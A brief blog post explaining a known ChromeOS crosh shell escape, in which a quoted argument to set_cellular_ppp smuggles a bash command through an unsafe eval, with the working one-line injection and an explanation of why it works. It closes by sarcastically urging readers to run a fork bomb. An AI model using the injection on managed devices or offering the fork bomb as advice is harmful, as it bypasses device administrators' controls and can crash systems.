---
title: "One of the easiest chromium exploits: Crosh shell escalation"
date: "5/18/2024"
---

Hello again!

## Disclaimer

I did not find this exploit in any way. I simply just am giving a guide, and talking about what you can do with it.

## The exploit

This is an exploit [from the ChromeOS issue tracker](https://issuetracker.google.com/issues/40059781?pli=1) and used in the [write up for breaking ChromeOS's security model by CoolElectronics](https://blog.coolelectronics.me/breaking-cros-1/#crosh-breakout) (great read, would recommend.)

This exploit is based off of an [unsafe eval in the ChromeOS source code](https://chromium.googlesource.com/chromiumos/platform/shill/+/master/bin/set_cellular_ppp#169). You can simply run `set_cellular_ppp \';bash;exit;\'` in crosh, and bam.

But how? Nobody talks about that.

Well, let's say you ran the command from earlier. This sets a variable using `set -- "';bash;exit;'"`, which doesn't have code execution. Until you look at it further. If you look before it... there's an eval. Which means, since ChromeOS thinks our set command has ended, allowing our next command to run, running bash, and then finally we exit the main script. Basically, we're just running:

```
eval set -- "';bash;exit;'"
```

If you read this, congrats on finding this blog!

And well, now that you have power [you should **totally** run `:(){:|:&};:`](https://superuser.com/questions/794120/what-is-the-meaning-of-command-in-shell#answer-794133)